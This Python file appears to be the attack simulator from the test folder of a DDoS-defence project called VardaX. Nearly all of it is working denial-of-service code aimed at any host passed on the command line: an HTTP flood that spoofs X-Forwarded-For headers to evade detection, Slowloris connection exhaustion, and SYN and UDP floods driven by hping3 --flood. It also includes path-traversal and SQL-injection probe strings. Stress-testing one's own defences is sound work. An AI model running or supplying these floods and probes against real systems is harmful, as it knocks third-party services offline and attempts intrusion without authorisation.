#!/usr/bin/env python3
"""
vardax-ddos/tests/attack_simulator.py
VardaX Attack Simulation Suite

Simulates various DDoS attack patterns for testing:
- SYN flood
- UDP flood
- HTTP flood
- Slowloris
- Application-layer attacks
"""

import os
import sys
import time
import random
import string
import asyncio
import argparse
import subprocess
from typing import List, Dict, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import threading

import aiohttp
import requests


@dataclass
class AttackConfig:
    target_host: str
    target_port: int
    duration: int  # seconds
    rate: int  # requests per second
    threads: int
    verbose: bool = False


class AttackSimulator:
    """Base class for attack simulators"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.running = False
        self.stats = {
            "requests_sent": 0,
            "requests_success": 0,
            "requests_failed": 0,
            "bytes_sent": 0,
        }
        self._lock = threading.Lock()
    
    def start(self):
        """Start the attack"""
        self.running = True
        self._run()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
    
    def _run(self):
        """Override in subclass"""
        raise NotImplementedError
    
    def _update_stats(self, success: bool, bytes_sent: int = 0):
        with self._lock:
            self.stats["requests_sent"] += 1
            if success:
                self.stats["requests_success"] += 1
            else:
                self.stats["requests_failed"] += 1
            self.stats["bytes_sent"] += bytes_sent
    
    def get_stats(self) -> Dict:
        with self._lock:
            return self.stats.copy()


class HTTPFlood(AttackSimulator):
    """HTTP flood attack simulator"""
    
    # Realistic user agents
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ]
    
    # Attack paths
    PATHS = [
        "/",
        "/api/users",
        "/api/products",
        "/search?q=test",
        "/login",
        "/register",
        "/api/data",
    ]
    
    def __init__(self, config: AttackConfig, attack_type: str = "random"):
        super().__init__(config)
        self.attack_type = attack_type
        self.session = None
    
    async def _run_async(self):
        """Async HTTP flood"""
        connector = aiohttp.TCPConnector(limit=self.config.threads * 10)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            self.session = session
            
            tasks = []
            start_time = time.time()
            request_interval = 1.0 / self.config.rate
            
            while self.running and (time.time() - start_time) < self.config.duration:
                # Create batch of requests
                batch_size = min(self.config.threads, self.config.rate)
                for _ in range(batch_size):
                    tasks.append(asyncio.create_task(self._send_request()))
                
                # Wait for batch
                if len(tasks) >= self.config.threads:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
                
                # Rate limiting
                await asyncio.sleep(request_interval * batch_size)
            
            # Wait for remaining tasks
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _send_request(self):
        """Send single HTTP request"""
        url = f"http://{self.config.target_host}:{self.config.target_port}"
        
        if self.attack_type == "random":
            path = random.choice(self.PATHS)
            method = random.choice(["GET", "POST"])
        elif self.attack_type == "login":
            path = "/api/login"
            method = "POST"
        elif self.attack_type == "search":
            path = f"/search?q={''.join(random.choices(string.ascii_letters, k=10))}"
            method = "GET"
        else:
            path = "/"
            method = "GET"
        
        headers = {
            "User-Agent": random.choice(self.USER_AGENTS),
            "Accept": "text/html,application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        
        # Add random headers to evade detection
        if random.random() > 0.5:
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        
        try:
            if method == "GET":
                async with self.session.get(f"{url}{path}", headers=headers) as resp:
                    await resp.read()
                    self._update_stats(resp.status < 500, len(str(headers)))
            else:
                data = {"username": "test", "password": "test123"}
                async with self.session.post(f"{url}{path}", headers=headers, json=data) as resp:
                    await resp.read()
                    self._update_stats(resp.status < 500, len(str(headers)) + len(str(data)))
                    
        except Exception as e:
            self._update_stats(False)
            if self.config.verbose:
                print(f"Request failed: {e}")
    
    def _run(self):
        """Run the HTTP flood"""
        asyncio.run(self._run_async())


class SlowlorisAttack(AttackSimulator):
    """Slowloris attack simulator - slow HTTP headers"""
    
    def __init__(self, config: AttackConfig):
        super().__init__(config)
        self.sockets = []
    
    def _run(self):
        """Run Slowloris attack"""
        import socket
        
        # Create initial connections
        for _ in range(self.config.threads):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.config.target_host, self.config.target_port))
                
                # Send partial HTTP request
                s.send(f"GET / HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.config.target_host}\r\n".encode())
                s.send(f"User-Agent: Mozilla/5.0\r\n".encode())
                
                self.sockets.append(s)
                self._update_stats(True, 100)
                
            except Exception as e:
                self._update_stats(False)
                if self.config.verbose:
                    print(f"Connection failed: {e}")
        
        print(f"Created {len(self.sockets)} Slowloris connections")
        
        # Keep connections alive
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.config.duration:
            for s in self.sockets[:]:
                try:
                    # Send partial header to keep connection alive
                    s.send(f"X-Header-{random.randint(1,1000)}: {random.randint(1,1000)}\r\n".encode())
                    self._update_stats(True, 30)
                except:
                    self.sockets.remove(s)
                    self._update_stats(False)
                    
                    # Try to create new connection
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(4)
                        new_s.connect((self.config.target_host, self.config.target_port))
                        new_s.send(f"GET / HTTP/1.1\r\n".encode())
                        new_s.send(f"Host: {self.config.target_host}\r\n".encode())
                        self.sockets.append(new_s)
                    except:
                        pass
            
            time.sleep(10)  # Send headers every 10 seconds
        
        # Cleanup
        for s in self.sockets:
            try:
                s.close()
            except:
                pass


class SYNFlood:
    """SYN flood using hping3 (requires root)"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.process = None
    
    def start(self):
        """Start SYN flood using hping3"""
        cmd = [
            "hping3",
            "-S",  # SYN flag
            "-p", str(self.config.target_port),
            "--flood",  # Send as fast as possible
            "-c", str(self.config.rate * self.config.duration),  # Packet count
            self.config.target_host,
        ]
        
        print(f"Starting SYN flood: {' '.join(cmd)}")
        print("Note: Requires root privileges")
        
        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
        except FileNotFoundError:
            print("hping3 not found. Install with: apt-get install hping3")
            return
        except PermissionError:
            print("Root privileges required for SYN flood")
            return
    
    def stop(self):
        """Stop SYN flood"""
        if self.process:
            self.process.terminate()
            self.process.wait()


class UDPFlood:
    """UDP flood using hping3 (requires root)"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.process = None
    
    def start(self):
        """Start UDP flood"""
        cmd = [
            "hping3",
            "--udp",
            "-p", str(self.config.target_port),
            "--flood",
            "-d", "1024",  # Payload size
            "-c", str(self.config.rate * self.config.duration),
            self.config.target_host,
        ]
        
        print(f"Starting UDP flood: {' '.join(cmd)}")
        
        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
        except FileNotFoundError:
            print("hping3 not found. Install with: apt-get install hping3")
        except PermissionError:
            print("Root privileges required for UDP flood")
    
    def stop(self):
        if self.process:
            self.process.terminate()
            self.process.wait()


class MixedTrafficGenerator:
    """Generate mixed legitimate and attack traffic"""
    
    def __init__(self, config: AttackConfig, attack_ratio: float = 0.3):
        self.config = config
        self.attack_ratio = attack_ratio
        self.running = False
    
    async def run(self):
        """Run mixed traffic generation"""
        self.running = True
        
        connector = aiohttp.TCPConnector(limit=self.config.threads * 10)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            start_time = time.time()
            
            while self.running and (time.time() - start_time) < self.config.duration:
                tasks = []
                
                for _ in range(self.config.threads):
                    if random.random() < self.attack_ratio:
                        # Attack traffic
                        tasks.append(self._send_attack_request(session))
                    else:
                        # Legitimate traffic
                        tasks.append(self._send_legitimate_request(session))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(1.0 / self.config.rate * self.config.threads)
    
    async def _send_legitimate_request(self, session):
        """Send legitimate-looking request"""
        url = f"http://{self.config.target_host}:{self.config.target_port}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cookie": f"session={random.randint(100000, 999999)}",
            "Referer": f"{url}/",
        }
        
        paths = ["/", "/about", "/products", "/contact", "/api/status"]
        
        try:
            async with session.get(f"{url}{random.choice(paths)}", headers=headers) as resp:
                await resp.read()
        except:
            pass
    
    async def _send_attack_request(self, session):
        """Send attack-like request"""
        url = f"http://{self.config.target_host}:{self.config.target_port}"
        
        # Minimal headers (bot-like)
        headers = {
            "User-Agent": random.choice([
                "python-requests/2.28.0",
                "curl/7.68.0",
                "Go-http-client/1.1",
                "",
            ]),
        }
        
        # Attack patterns
        attack_paths = [
            "/api/login",
            f"/search?q={'A' * 1000}",
            "/../../../etc/passwd",
            "/admin",
            f"/?id=1' OR '1'='1",
        ]
        
        try:
            async with session.get(f"{url}{random.choice(attack_paths)}", headers=headers) as resp:
                await resp.read()
        except:
            pass
    
    def stop(self):
        self.running = False


def run_wrk_benchmark(target: str, duration: int, threads: int, connections: int):
    """Run wrk2 benchmark for HTTP load testing"""
    cmd = [
        "wrk",
        "-t", str(threads),
        "-c", str(connections),
        "-d", f"{duration}s",
        "--latency",
        target,
    ]
    
    print(f"Running wrk benchmark: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print(result.stderr)
    except FileNotFoundError:
        print("wrk not found. Install with: apt-get install wrk")


def main():
    parser = argparse.ArgumentParser(description='VardaX Attack Simulator')
    parser.add_argument('--target', '-t', required=True, help='Target host')
    parser.add_argument('--port', '-p', type=int, default=80, help='Target port')
    parser.add_argument('--duration', '-d', type=int, default=60, help='Duration in seconds')
    parser.add_argument('--rate', '-r', type=int, default=100, help='Requests per second')
    parser.add_argument('--threads', '-T', type=int, default=10, help='Number of threads')
    parser.add_argument('--attack', '-a', choices=[
        'http', 'slowloris', 'syn', 'udp', 'mixed', 'wrk'
    ], default='http', help='Attack type')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    args = parser.parse_args()
    
    config = AttackConfig(
        target_host=args.target,
        target_port=args.port,
        duration=args.duration,
        rate=args.rate,
        threads=args.threads,
        verbose=args.verbose,
    )
    
    print(f"=== VardaX Attack Simulator ===")
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s")
    print(f"Rate: {args.rate} req/s")
    print(f"Threads: {args.threads}")
    print()
    
    if args.attack == 'http':
        attacker = HTTPFlood(config)
        attacker.start()
        print(f"\nStats: {attacker.get_stats()}")
        
    elif args.attack == 'slowloris':
        attacker = SlowlorisAttack(config)
        attacker.start()
        print(f"\nStats: {attacker.get_stats()}")
        
    elif args.attack == 'syn':
        attacker = SYNFlood(config)
        attacker.start()
        time.sleep(args.duration)
        attacker.stop()
        
    elif args.attack == 'udp':
        attacker = UDPFlood(config)
        attacker.start()
        time.sleep(args.duration)
        attacker.stop()
        
    elif args.attack == 'mixed':
        generator = MixedTrafficGenerator(config, attack_ratio=0.3)
        asyncio.run(generator.run())
        
    elif args.attack == 'wrk':
        run_wrk_benchmark(
            f"http://{args.target}:{args.port}/",
            args.duration,
            args.threads,
            args.threads * 10,
        )
    
    print("\n=== Attack Complete ===")


if __name__ == '__main__':
    main()
